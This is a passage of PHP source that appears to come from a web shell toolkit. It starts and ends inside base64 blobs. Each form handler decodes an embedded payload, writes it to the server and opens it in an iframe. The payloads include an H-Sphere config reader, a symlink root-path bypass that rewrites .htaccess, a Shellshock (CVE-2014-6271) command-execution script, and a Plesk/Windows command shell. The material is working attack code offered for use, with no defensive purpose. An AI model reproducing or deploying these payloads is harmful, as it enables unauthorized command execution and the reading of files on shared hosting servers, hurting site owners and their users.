ZU50V1VvZVRPc0JGWHNpclRXVE1jd01XWmtTa1N2UjB5NGF3cGRUYVZlRkxsOUREeUdvUnlGNGxB
QThXMzVKaDEzS3ZQcUFYbWVXOFlXbGhBSU1mTC9kc1dSQWYyT1VoVEh4bUUvSVZGSHZ0bnM5bng2
aHRzWEM5MEdTajc0bXVrVitzQ2d4WVJPQk9NbkM2bDNBN2dLNzl3ZlJxM1JZY0VBOWw3ZE9PdjU4
QUdVZFdBUmJTSFpjTXRIaVNXR3lZMEc2S1BNTlFTaGR6L1ZnemdRVDNuVW03ZlNVbWVJUjFWWkJw
RnRWYkQxakZ0azNxeGY5T3hrenV5OUVsdENxMlMzNS9KellEM3VsSXpXYndjbkhNZ1U1Z1ljQWFR
czJ5bzcxSXh6cWsvRmRUelBXZ3VIMUhKNkQ0TjR2QVBNWVIwdDJaek9BYm9sTDFHNlRIQWdjcmM3
RzQvRnNzL2g0NTNjS1dhSk4wSkp6UlRRTFNqWTZsWkxlL0c2NmhZYUFzRkhrVWp3K3JRaEhXelp5
YjR0ZFhkY3RvcytqUHRGVnF5NUhWNzhqLzc2bjVFZHpQalh0UVBUZ3RUdUswb0FFVVcyVmNaaEpC
SFA2UzR1RUMxYzFSek9HbTdPSkdkZndiZGk4dFh6QzNOMWVYa1Z5V24xbUd3ZGgrZ2RTNjJ0ZzlY
cnNDeGF5M1d0eXJKY2ZGcDZ0MlZPa3EzK2lVVjZDOUtoM0NpREExNVN2cGRrOURicFNZZjVBWVlB
R0dxNFpPNEVERzF1aENFWU1GdTJyWldEQTVoaklZM2p1Z1B6TCtpZkRrNkc2K0FOZnF4TlQwK0hG
dW8wWUxPd3RIMERqWDF2NFZRNHR3VXRvdzVMLzVtcGlMbXR3SHZtK3ZMTHhubW82UlB2akNTdi94
WEZQb2d1eitTWHliS3U2N0pVV3YrNjFjVWlKOEdQOENyaDh2ODdLY2hGeGJ4RGlLczRrUEFOZDVT
WGE3MnNtVk84Ulh1TGt3Um9TWjluQ1E3bFZ3Zk9sRkN5alpia3lmei9BbS9WRjZjaFRvblpJQmdp
L3Ywb1poTWRtem83SGRQRERIeEJhTDNnb0dJNHpBVkhJUXZFcVdKQTBEOGkzenJvVWQ3dTFlZ2g3
UjBtSm53Z1JFdVJVWHlYTWFaZ2R6WklNeWFhOXUyOVhzTWEzbVZzaVBCelJncGJPd0dMMlBvVFRz
dkt1SUZFYVA4VUxpaC9FbGFmKzl4dW02anU5MFk5bllYbHlIVWd3Uk1oZVdYZWRqR3ZuUVVQUytr
YjVlUGtzYzNYZU9wOGQya09TdnFxYkp4VlUwNEQ2TUF6VEhHWUF4NWN5QjhEYjdrWThSNmU0ZUpz
OUhCUDMzbnFCN2lHejk5R3BZUU8xak9PM29wRUV0SWIrdFZyL095dnI1djd3T2hYV0VFRDJUMTVw
WnlaOFhGMmM1N2l6VjYxYXZWL0I2eklCckwrRWdNOHdCVXFFQTlBYlR1M3BrTE5lY2UrOVEzWTFJ
QjNMa2NBSEhyMUxOaEZmUTR0UEZjaEQ4eXNYbmdJMStQdjlMTDJkeExUOGNLWWNMUVp4MWhPT0RI
VWcyUUNWRUhkNFFLQnhCZG03RFI4Snp1dm15bXBRbFdKS1NGV1JWQ1NydlRmYzdrTEMrNzRvdnZN
RjAxL29ub01NaEtsd2NBeGpYY294akczZmlsNG9LN0RXaUNIdHVWNC92WlhtZVNlajE2VUs2SWZG
ckx5UFVHMXdEb2x0NU9ZYWNuRXBZTUhjTkIyb2JmREhSVDdNVXI3NDlkTm9vQThuYlZGamM4R3Fi
Nk83eVAxYWU4Wlg4VndBQWJTdUJZSndpVlRyKzZySDdZSFdzUlFqUkp3MlFVZkVyOGtnMEJOcVIw
L2RUeFlDdVo2ajNMZEdOY2wxR2pGeW1yTEpiSTUvcHdrSFVkMHAxRE8zK1JyL2hQVjlLeFQ2SE1S
RURTVkxTZkgrRTR3QWc4K1BPcU5NRitaNnBacG5EWFd4cEUzU3FoaGVyMElVeFoxNXZqeWJTQWpI
TVRFZkUwOUg4T3NSWmtaWDFldDBPWnQ3eTJ5a1ExMkJ1ZEhZTVBtcmJ4bXBhSjkxdk9FVWVZUldX
M29tdFRFOSt2M3plVkFyUktDbzRwWGNPU1RLTDBJbytBV2NaWDhUbHFRWlVBM0dFR00rWkw4UjR1
WWVNWnFnakQyQ05EQ2wva2JobnBmem1EM3Y2TkJSejNFTVdZYnVxbGxkNVJjU05aSjQwTU5WNzh2
akhkbkcrZXFyZ0J5cjMrbm5WdDgxVmVqNkpsQWpzMm1xalR4b08yT21WRTR6QVFwTW9CTitub3l0
aGkvVW84cVhpMHUyWWlCNnFiZ3oxMkg1bWdPNTFBUTYxc3g4OU44RlhmZEJpK2Y3Q0ZMTE5Hcjkw
K1U3dXliVEt0K05HZFB4b2syZ3RYVFpSMjFQN04zKzZXYThSanVCVDE5bmVzOWhOT3lLZDMyUjhO
ZXU2c2pXOUtHS3VqNDFIUE4yU3hkcC9KLzdjcVhiQXFXNzRLanpkNkRWMXViY1hJN3FwT1JTUXJ2
bWM3M0RpbSsxcTBuQWlkRE80U09xU0wxNVdhUGJRMFY5NU8yWC9IZzkxV3JnMVlHNStsaEZxMVZn
YzlrbHFDaUpwNDE0UDZIM2IxanY1eUhBV3BOOEltVlQ2YjAyM1lhQXhpTFpkci9nemkvOW11TUhN
SFBuZEhFVU5YWThWRmVEZ0tmK1V4cklhMDFYTFdQWEQxcUYvZGxMNTVjakhoSThUUUdvNWFNQjhS
cEJ6d0tHa1l5WldibDJnYVUyMzdOSzNHQnRhZEFnM2lBYmNyZjEwRUZJUnpwZ1hNeGt4ZnVLYmJ1
WmtzOUN2TFJodFBZYm1wbzF6TjkyeHJoSFB0Z29FVmdPcm5PWThCMER6dzNGZXFYVlBZNmxlM3NT
NTd2S1FBWnFiWW92ZWoycU1ETjErQ2J4ejVyVEtrdlJxcjc3a2tzVUpzVzltdjhFUWI1cy9kc2da
dld0MVRlR0FnaUgxd05RalAwUUcvSUhlc1ErUmRLbDdNbjB2dDF3em5wVlQ3dU91dDlmWW1kM3Br
d2xkMUlSa0phNnVDYS9xN3FzYXBSYjBYdWJNM254Mzlhc29hbWpjemlQc25FRDNiMFZBNUdVMmVa
SHdzeFFtTXBuTVYrVVBLQmt1a3pTcUZhblpqdndheXFzRWV3VE02V0xZZnVPU3dPK0oyd1N3bkpi
VmNQVTEyTzh3ZlUrbGp1ZUsxVzM3S0VSSlprRW8zejZZbXo4ZzE2UkMreCs4VDVnblV0S1l0dXFj
UUVxbzczYmNlNVFKWGxLNDJ6MWxxWXo4VnRmMzVOdXZCdnFhVmlCcnNFYSszdnNGNEY1Unl3NGtU
SG81cDZSZmtmYkEyVkE4T0g1YUVudG1pZFgrMkYvMDQvY0swMXkyWVRCZHdYbmVpUGFMYjh5aUtx
c2ttNGU5eHp6MG1xcW1ILzR1OGs4ZmlPaFc1QkdtYXpIZWdRaHN5MWZ0RGwzanRJcHZuRUdiVWlV
enhxbkl0K1AvLzg2TGh0TExPOHpkanFUemM1V29EZUhVMy9Ddm8vOEFTc2s1Rkxabkp5QTRVczV4
alMzekJqTzJyZEROOWQxd2dxdnRzVEJtdUFkNytnTEk1TnRobHVqYUhWQ2QxWGVDajlzQTFORk4v
SHlua2NRSzMrQVkzWFAyWUM5WDJ4NWhyVDRGWUl4QjJibHIrSVFvMlpyRVNZY1VyakNpazBEZkx5
YTNvVENYdzNIUnNkQkoyL0NzWDN4NGxUVFB6Ynl6QUgwREtGQ2IvcFBpbzZ6cUlWYXZmTU5FOGRI
N2tBRUtQaGptWHM4OGxJQXlJMkIralZVZ00wTUtBb2NoVTNkcmJ1SHYzNDgrN0kzVmlLRDVtNkZx
S3hFRzNTU1dVd0gydEx4QkR5M0lwVGI1bnpzaTNEYUo3cEZiR0dzeEF5a0ExMjZ3aEFCMy9aaW1C
UmMrQVpDTkdEckJJZlpnWHB2UVJkS3E4QU8xOFVReElDVTdjbVBQNnZmOXBTS05zSzRmQ2lsRzlR
dmtvVGVRUXkyblp0TTdST3hEQ1ExMXRudmpOODFpQUxOcC9mYXFNY2dCRHZZVFh5NlZvQVFJRTM1
Rkw2dkdPVnZXSkFZU2R2c3FzVTFyQ0JmWmxBZ2g4Nmtna2ljdnl3NldhU0wvNEtRWHk0VlJQdGRk
NUc5ODB1cXo3RitrNFhvODBDYXptYmhMUFEyQTF1UGZkTnBMYVVuMEc5Vmc2WERyQ08wcVVBbmRp
ZzduQ0ROUmNvUEJiTGpFSytLVlU2dGgrUk04M1ZnR09wZmFZVmdCYW5jM2E4a0wxdGp6SVVuaEx1
Tk9nWUdCMFJxa0psVXhwOGRPSzNwWkVKTVEzK3YvYTJ6WE5meVJaUVo4KzJvTG1OQ2JLTlFJRzUr
RFZYNmtSa3lmMmxESWhwanFOWVJ3ekZOS1NtVXJzWW9jOGRpamhlWnBJa3hkQWw1MnFIdXRVMllk
UTRVQ3o4bm1sbHhKekRvYUE5OUlOVWFHSE1wY0VXWTJPOTQ2L2tobjVaUGdsVnZKWlRiQko0cnNq
Z3gyZ2sva0VoMXpRZktCakNWT2NSc2hVVUlSRkt6Q0xkOW1iQ2M0RmtuTXd0SndmWTRJWFUrc21j
VzN4VkxYOG1hUzFlemc4YVlTengvdFhTQWdYRDh1clFBTlc5ZnRGZW9JKzNQWEZiWld6eUltUUl5
QVdHTjIvL2RPUWZaWmI2cHExa3BxQkYzYm1rdDh4Z2d2aTJ6YTFaTjBzUTBnblF1UFpIcGduWFl2
OVVTZjhReU5XVWZoNmFURG1hTlBWYUNhQ21zVHRycHRkbldjcHlnZlVjV04rTnJMaUJaZVV3NjMv
dnVkRVQ5bHRYenlXRDkreGpnajcxZEIrcVhJSWpsSzFyN20vRTlyV3UwUUhhWTFubDRCLzU5WW5m
ckcyclYyKzFuYnhlallaVkhSMUhEU1pmTzUrNzNsUmNKVHloVHVDdlQxZFRUSG5mYW1LR092cE1S
bDJ5OUhWaFo0bG1SdjdOS1JlU2FUSm9Gb2sxQWgyeEphUFRFWm9ZN1Y0U21zeGYyRWFDNldJM0JN
VjRINWw1eXUrMjVLYWgwd1V6bjBiaDUycHM1dnppZkl0NmJlUDdkeHFQTURJam9XN1NWdnJydlp5
YzlGYWZQeE1hNUs5TWFBTWlGbEpGOW5oYjQ0ZjFlVDg0OG5QcENSU1pLYWhLbzJVRTFwbzkzaks4
OEdORmt3L09HeXJaTDdta01Sc0FUdWlmd0RjTzJ2ei9BYXdGd0V3cEdaMlQrWWU4N3RMVDhXdFdp
a2pFVEtyelhxcWJYM0IwSGRSUFYzV3A5RkJ6aHBIYjRmdURnamtLMkxoN01uZkc4RGdRc3J5Z2pi
YjB3T2lYcnJZaGF1UGg5WkIxVDM4UVVtYVR5dHplR0ZWdDJoQnB1cmtVM1hpa05hSkVLSDVJSFpK
MHRpb01wQzZ2K0ZDRzZUeU5aU0twK2dKUiszSWdaMUlQRjFtdkx6Q09OcHEvVlV6SzczTzNNVEl6
MnN5NUF6NFlhUFo2bHYwSkl4WVR0WmJiSG5pWFk5QVVkbGNSNU1lSGIwaE5mZEJXcHlmdmlGWlBa
Yks3cCsyVm95dXpIKzlrd3BDYVlPNEFnMkpFd1E5T1VsVEJjVk9HaVlUdFJTc09yc01rL0I5Q2Z6
QUlXTlVRdi9WUjJKMmZwcUd4ZG9XYWFveXhwa1ZGNkprVXBhb3hwdjFZUitFSlE1T1J3Nm9ROE9w
OHFWS3J3bm9HMURBOXhDelV1NVF6ejlRL0FaQ1lZTHREaEY4dTlxK01NcHRQVTU3OW0ycVo1RDVR
OFkzMmE1bjdJU0xzMmRybzBkL1kyQ0E1aGlMeWlIbElnYUNGbENZSVVlUDc3My8vNDY2Ky8vdm5I
My8vNTE5Ly9Bdz09JykpKTsKPz4=';

$file = fopen("conf.php" ,"w+");
$write = fwrite ($file ,base64_decode($conf));
fclose($file);
   echo "<iframe src=confbypass/conf.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit24']))
{
    mkdir('hsphere', 0755);
    chdir('hsphere');

$hsp = 'PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsKaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAw
KTsKJHRpdGxlID0gIkgtU3BoZXJlIFRvb2wiIDsKCiRkaXIgPSAiPHRhYmxlIGJvcmRlcj0nMScg
c3R5bGU9J2JvcmRlci1jb2xsYXBzZTogY29sbGFwc2UnPgogICAgICAgIDx0cj4KICAgICAgICAJ
PHRkPlNlcnZlck5hbWU8L3RkPgogICAgICAgIAk8dGQ+RG9jdW1lbnRSb290PC90ZD4KICAgICAg
ICAJPHRkPlZ1bG5lcmFibGU8L3RkPgogICAgICAgIDwvdHI+CiAgICAgICAgIjsKJGNoc3BoZXJl
ID0gIi9oc3BoZXJlL2xvY2FsL2NvbmZpZy9odHRwZC9zaXRlcy8iOwokb3BlbmRpciA9IG9wZW5k
aXIoJGNoc3BoZXJlKTsgCndoaWxlICgoJGZpbGUgPSByZWFkZGlyKCRvcGVuZGlyKSkgIT09IGZh
bHNlKSB7CiRwYXRoID0gJGNoc3BoZXJlLiRmaWxlOwoKJHJlYWRmaWxlID0gZm9wZW4oJHBhdGgs
InIiKTsKJGNvbnRlbnQgPSBmcmVhZCgkcmVhZGZpbGUsZmlsZXNpemUoJHBhdGgpKTsKZmNsb3Nl
KCRyZWFkZmlsZSk7CgokRG9jdW1lbnRSb290ID0gZXhwbG9kZSgnRG9jdW1lbnRSb290JywgJGNv
bnRlbnQgKTsKJERSb290ID0gZXhwbG9kZSgnU2VydmVyTmFtZScsICREb2N1bWVudFJvb3RbMV0g
KTsKCiRTZXJ2ZXJOYW1lID0gZXhwbG9kZSgnU2VydmVyTmFtZScsICRjb250ZW50ICk7CiRTTmFt
ZSA9IGV4cGxvZGUoJ1NlcnZlckFsaWFzJywgJFNlcnZlck5hbWVbMV0gKTsKCiRkaXIgLj0gIjx0
cj48dGQ+Ii4kU05hbWVbMF0uIjwvdGQ+PHRkPiIuJERSb290WzBdLiI8L3RkPjx0ZD51bnNlY3Vy
ZTwvdGQ+PC90cj4iOyAvL2Rpc2luaSBrYW11IGJpc2EgYmlraW4gbGluayBrZSB3ZWJzaGVsbG55
YSBjb2VnLiAKfQpjbG9zZWRpcigkb3BlbmRpcik7CiRkaXIgLj0gIjwvdGFibGU+IjsKCj8+Cjwh
RE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8v
RU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwu
ZHRkIj4KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5n
PSJlbiIgbGFuZz0iZW4iPgo8aGVhZD4KCTxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIg
Y29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIC8+CiAgICA8dGl0bGU+PD9w
aHAgZWNobyAkdGl0bGUgPz4gLSBJbmRvbmVzaWEgVW5kZXJHcm91bmQgQ29kZXI8L3RpdGxlPgog
ICAgICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CiAgICAgICAgICAgICp7IGNvbG9yOiB3aGl0
ZTt9CiAgICAgICAgCWJvZHkgeyBiYWNrZ3JvdW5kOiBCbGFjazsgIH0KICAgICAgICAgICAgI3hj
cmV3IHsgd2lkdGg6ODAwcHggYXV0byA7IGJhY2tncm91bmQ6ICMwMDA7IG1pbi1oZWlnaHQ6IDIw
MHB4OyBib3JkZXI6IDFweCBvdXRzZXQgIzQ1NDU0NTsgbWFyZ2luOiA1MHB4OyBwYWRkaW5nOiA1
cHg7IH0KICAgICAgICAgICAgI291dHB1dCB7Y29sb3I6ICMzMzMgO30gCiAgICAgICA8L3N0eWxl
PiAgICAgCjwvaGVhZD4KPGJvZHk+CjxwIHN0eWxlPSJmb250LXNpemU6IDI0cHg7IHRleHQtYWxp
Z246IGNlbnRlcjsgY29sb3I6IHJlZDsiPjxzdHJvbmc+Ljo6IDw/cGhwIGVjaG8gJHRpdGxlID8+
IC0gSW5kb25lc2lhIFVuZGVyR3JvdW5kIENvZGVyIDo6Ljwvc3Ryb25nPjwvcD48YnIvPgo8ZGl2
IGlkPSJvdXRwdXQiPgo8P3BocCBlY2hvICRkaXIgPz4KPC9kaXY+CjwvZGl2Pgo8L2JvZHk+Cjwv
aHRtbD4=';

$file = fopen("hsp.php" ,"w+");
$write = fwrite ($file ,base64_decode($hsp));
fclose($file);
$rootb = 'PHRpdGxlPkJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlciAmIFZpcnVzYSBX
b3JtPC90aXRsZT4KPC9oZWFkPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIGhyZWY9Imh0dHA6
Ly93d3cuaWNvbmouY29tL2ljby9jL3UvY3UxYm1wZ2Ixay5pY28iIHR5cGU9ImltYWdlL3gtaWNv
biIgLz4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj48IS0tIGJvZHkge2JhY2tncm91bmQtY29sb3I6
ICMxNTE1MTU7IGZvbnQtZmFtaWx5OkNvdXJpZXIgICAgICAgCm1hcmdpbi1sZWZ0OiAwcHg7IG1h
cmdpbi10b3A6IDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBOZXc7Zm9udC1zaXplOjEycHg7Y29s
b3I6IzAwOTkwMDtmb250LXdlaWdodDo0MDA7fQphe3RleHQtZGVjb3JhdGlvbjpub25lO30gYTps
aW5rIHtjb2xvcjojMDA5OTAwO30gYTp2aXNpdGVkIHtjb2xvcjojMDA4MDgwO30gYTpob3Zlcntj
b2xvcjojZmYwMDAwO30gYTphY3RpdmUge2NvbG9yOiMwMGEyYTI7fQotLT48IS0tIE1hZGUgQnkg
TWF1cml0YW5pYSBBdHRhY2tlciAtLT48L3N0eWxlPgo8YnI+PGJyPjxib2R5IGJnQ29sb3I9IjE1
MTUxNSI+PHRyPjx0ZD4KPD9waHAKZWNobyAiPGZvcm0gbWV0aG9kPSdQT1NUJyBhY3Rpb249Jyc+
IiA7IGVjaG8gIgo8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQn
IG5hbWU9J01hdXJpdGFuaWEnPjwvY2VudGVyPiI7CmlmIChpc3NldCgkX1BPU1RbJ01hdXJpdGFu
aWEnXSkpeyBzeXN0ZW0oJ2xuIC1zIC8gTWF1cml0YW5pYS50eHQnKTsKJGZ2Y2tlbSA9J1QzQjBh
Vzl1Y3lCSmJtUmxlR1Z6SUVadmJHeHZkMU41YlV4cGJtdHpEUXBFYVhKbFkzUnZjbmxKYm1SbGVD
QnpjM056YzNNdWFIUnREUXBCWkdSVWVYQmxJSFI0ZENBdWNHaHdEUXBCWkdSSVlXNWtiR1Z5SUhS
NGRDQXVjR2h3JzsKJGZpbGUgPSBmb3BlbigiLmh0YWNjZXNzIiwidysiKTsgJHdyaXRlID0gZndy
aXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkZnZja2VtKSk7ICRNYXVyaXRhbmlhID0gc3ltbGlu
aygiLyIsIk1hdXJpdGFuaWEudHh0Iik7CiRydD0iPGJyPjxhIGhyZWY9TWF1cml0YW5pYS50eHQg
VEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSNmZjAwMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIg
TmV3Jz48Yj4KQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5PC9iPjwvZm9udD48L2E+IjsKZWNobyAiPGJy
Pjxicj48Yj5Eb25lLi4gITwvYj48YnI+PGJyPkNoZWNrIGxpbmsgZ2l2ZW4gYmVsb3cgZm9yIC8g
Zm9sZGVyIHN5bWxpbmsgPGJyPiRydDwvY2VudGVyPiI7fSBlY2hvICI8L2Zvcm0+IjsgID8+PC90
ZD48L3RyPjwvYm9keT48L2h0bWw+';

$file1 = fopen("rootb.php" ,"w+");
$write = fwrite ($file1 ,base64_decode($rootb));
fclose($file1);
   echo "<iframe src=hsphere/hsp.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit25']))
{
    mkdir('shockbypass', 0755);
    chdir('shockbypass');

$shock = 'PD9waHAKZnVuY3Rpb24gc2hlbGxzaG9jaygkY21kKSB7IC8vIEV4ZWN1dGUgYSBjb21tYW5kIHZp
YSBDVkUtMjAxNC02MjcxIEAKbWFpbC5jOjI4MwogICBpZihzdHJzdHIocmVhZGxpbmsoIi9iaW4v
c2giKSwgImJhc2giKSAhPSBGQUxTRSkgewogICAgICR0bXAgPSB0ZW1wbmFtKCIuIiwiZGF0YSIp
OwogICAgIHB1dGVudigiUEhQX0xPTD0oKSB7IHg7IH07ICRjbWQgPiR0bXAgMj4mMSIpOwogICAg
IC8vIEluIFNhZmUgTW9kZSwgdGhlIHVzZXIgbWF5IG9ubHkgYWx0ZXIgZW52aXJvbm1lbnQgdmFy
aWFibGVzCndob3NlIG5hbWVzCiAgICAgLy8gYmVnaW4gd2l0aCB0aGUgcHJlZml4ZXMgc3VwcGxp
ZWQgYnkgdGhpcyBkaXJlY3RpdmUuCiAgICAgLy8gQnkgZGVmYXVsdCwgdXNlcnMgd2lsbCBvbmx5
IGJlIGFibGUgdG8gc2V0IGVudmlyb25tZW50IHZhcmlhYmxlcwp0aGF0CiAgICAgLy8gYmVnaW4g
d2l0aCBQSFBfIChlLmcuIFBIUF9GT089QkFSKS4gTm90ZTogaWYgdGhpcyBkaXJlY3RpdmUgaXMK
ZW1wdHksCiAgICAgLy8gUEhQIHdpbGwgbGV0IHRoZSB1c2VyIG1vZGlmeSBBTlkgZW52aXJvbm1l
bnQgdmFyaWFibGUhCiAgICAgbWFpbCgiYUAxMjcuMC4wLjEiLCIiLCIiLCIiLCItYnYiKTsgLy8g
LWJ2IHNvIHdlIGRvbid0IGFjdHVhbGx5CnNlbmQgYW55IG1haWwKICAgfQogICBlbHNlIHJldHVy
biAiTm90IHZ1bG4gKG5vdCBiYXNoKSI7CiAgICRvdXRwdXQgPSBAZmlsZV9nZXRfY29udGVudHMo
JHRtcCk7CiAgIEB1bmxpbmsoJHRtcCk7CiAgIGlmKCRvdXRwdXQgIT0gIiIpIHJldHVybiAkb3V0
cHV0OwogICBlbHNlIHJldHVybiAiTm8gb3V0cHV0LCBvciBub3QgdnVsbi4iOwp9CnNoZWxsc2hv
Y2soJF9SRVFVRVNUWyJjbWQiXSk7Cj8+';

$file = fopen("shock.php" ,"w+");
$write = fwrite ($file ,base64_decode($shock));
fclose($file);
   echo "<iframe src=shockbypass/shock.php?cmd=id width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit26']))
{
    mkdir('plesk', 0755);
    chdir('plesk');

$ple = 'PD9waHAKIyBQbGVzayBQYXJhbGxlbHMgQnlQYXNzZXIgdjAuMQojIENvZGVkIGJ5IDEzMzdiMHgK
IyBTZWM0ZXZlci5jb20gJiBNYWRMZWV0cy5jb20KCj8+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2
PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+Cjx0aXRsZT4jIFBhcmFsbGVscyBX
aW5kb3dzIEJ5cGFzc2VyIC0gQnkgMTMzN2IweCA8L3RpdGxlPgo8L2hlYWQ+Cgo8cCBhbGlnbj0i
Y2VudGVyIj4KPGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL3RoZXZhcmd1eS5jb20vc2l0ZS1m
aWxlcy90aGV2YXJndXkuY29tL2ZpbGVzL2FyY2hpdmUvdGhldmFyZ3V5LmNvbS93cC1jb250ZW50
L3VwbG9hZHMvMjAwOS8xMi9QYXJhbGxlbHNfbG9nby5qcGciIHdpZHRoPSI1MzUiIGhlaWdodD0i
MjE0Ij48L3A+CjxwIGFsaWduPSJjZW50ZXIiPgo8Zm9udCBmYWNlPSJUYWhvbWEiPlsgPGZvbnQg
Y29sb3I9IiNGRjAwMDAiPjxhIGhyZWY9Ij8iPgo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9u
OiBub25lIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+SG9tZTwvZm9udD48L3NwYW4+PC9hPjwvZm9u
dD4gCl0mbmJzcDsgWyA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+PGEgaHJlZj0iP2FjdGlvbj1jb21t
YW5kIj4KPHNwYW4gc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZSI+PGZvbnQgY29sb3I9IiNG
RjAwMDAiPkNvbW1hbmQgU2hlbGw8L2ZvbnQ+PC9zcGFuPjwvYT48L2ZvbnQ+IApdIFsgPGZvbnQg
Y29sb3I9IiNGRjAwMDAiPjxhIGhyZWY9Ij9hY3Rpb249ZXhlYyI+CjxzcGFuIHN0eWxlPSJ0ZXh0
LWRlY29yYXRpb246IG5vbmUiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5FeGVjdXRlIEZpbGVzPC9m
b250Pjwvc3Bhbj48L2E+PC9mb250PiAKXTwvZm9udD48L3A+CgoKPD9waHAKaWYoJF9SRVFVRVNU
WydhY3Rpb24nXSA9PSAiY29tbWFuZCIpCnsKPz4KPGZvcm0gbWV0aG9kPSJQb3N0IiBBY3Rpb249
Ij9hY3Rpb249Y29tbWFuZCI+CjxwIGFsaWduPSJjZW50ZXIiPgombmJzcDs8L3A+CjxwIGFsaWdu
PSJjZW50ZXIiPjxmb250IGZhY2U9IlRhaG9tYSI+Jm5ic3A7PGZvbnQgY29sb3I9IiNGRjAwMDAi
PkNvbW1hbmQ8L2ZvbnQ+Jm5ic3A7CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJDb21tYW5kIiB2
YWx1ZT0iPD9waHAgaWYoaXNzZXQoJF9QT1NUWydDb21tYW5kJ10pKSBlY2hvICRfUE9TVFsnQ29t
bWFuZCddOyBlbHNlIGVjaG8gJ3dob2FtaScgPz4iIHNpemU9IjU0IiBzdHlsZT0iZm9udC1mYW1p
bHk6IFRhaG9tYTsgY29sb3I6ICNGRjAwMDA7IGJvcmRlcjogMXB4IGRvdHRlZCAjRkYwMDAwIiA+
Jm5ic3A7Jm5ic3A7CjwvZm9udD4KPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iVGFob21h
Ij4KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUiIHN0eWxlPSJmb250LWZhbWls
eTogVGFob21hOyBjb2xvcjogI0ZGMDAwMDsgYm9yZGVyOiAxcHggZG90dGVkICNGRjAwMDAiPjwv
Zm9udD48L3A+CjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4KCjw/cGhwCiRDb21tYW5kID0g
JF9QT1NUWydDb21tYW5kJ107CmlmKGlzc2V0KCRDb21tYW5kKSAmJiAkQ29tbWFuZCA9PSAiIikK
ewplY2hvICc8Y2VudGVyPjx0ZXh0YXJlYSByb3dzPSIxIiBjb2xzPSIxMDUiIHN0eWxlPSJmb250
LWZhbWlseTogVGFob21hOyBjb2xvcjogI0ZGMDAwMDsgYm9yZGVyOiAxcHggZG90dGVkICNGRjAw
MDAiIG5hbWU9IkV4ZWN1dGVkQ29tbWFuZCI+JzsKZWNobydbK10gQ29tbWFuZCBJcyBOVUxMIG9y
IFVuZGVmaW5lZCBvciBBY2Nlc3MgSXMgRGVuaWVkICwgVHJ5IEFnYWluIFdpdGggQW5vdGhlciBD
b21tYW5kJzsKZWNobyc8L3RleHRhcmVhPic7Cn0KaWYoaXNzZXQoJENvbW1hbmQpICYmICRDb21t
YW5kICE9ICIiKQp7CmVjaG8nPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iVGFob21hIiBj
b2xvcj0iI0ZGMDAwMCI+Jm5ic3A7WypdIEV4ZWN1dGVkIENvbW1hbmQ8L2ZvbnQ+PC9wPgo8cCBh
bGlnbj0iY2VudGVyIj4KPHRleHRhcmVhIHJvd3M9IjI1IiBjb2xzPSI5NCIgc3R5bGU9ImZvbnQt
ZmFtaWx5OiBUYWhvbWE7IGNvbG9yOiAjRkYwMDAwOyBib3JkZXI6IDFweCBkb3R0ZWQgI0ZGMDAw
MCIgbmFtZT0iRXhlY3V0ZWRDb21tYW5kIj4KJzsKJFdzY3JpcHQgPSBuZXcgQ09NKCdXc2NyaXB0
LlNoZWxsJykgb3IgZGllKCJXU2NyaXB0IFNoZWxsIElzIE5vdCBBY3RpdmUgISIpOwokRXhlY3V0
ZSA9ICRXc2NyaXB0LT5FeGVjKCJjbWQuZXhlIC9jIi4kX1JFUVVFU1RbJ0NvbW1hbmQnXS4iIik7
CiRTdGRPdXQgPSAkRXhlY3V0ZS0+U3RkT3V0KCk7CiRSZXN1bHQgPSAkU3RkT3V0LT5SZWFkQWxs
KCk7CmVjaG8gJFJlc3VsdDsKZWNobyc8L3RleHRhcmVhPjwvcD4nOwp9Cn0KaWYoJF9SRVFVRVNU
WydhY3Rpb24nXSA9PSAiZXhlYyIpCnsKPz4KPGZvcm0gbWV0aG9kPSJQb3N0IiBhY3Rpb249Ij9h
Y3Rpb249ZXhlYyI+CjxwIGFsaWduPSJjZW50ZXIiPgombmJzcDs8L3A+CjxwIGFsaWduPSJjZW50
ZXIiPjxmb250IGZhY2U9IlRhaG9tYSI+Jm5ic3A7PGZvbnQgY29sb3I9IiNGRjAwMDAiPkZpbGUg
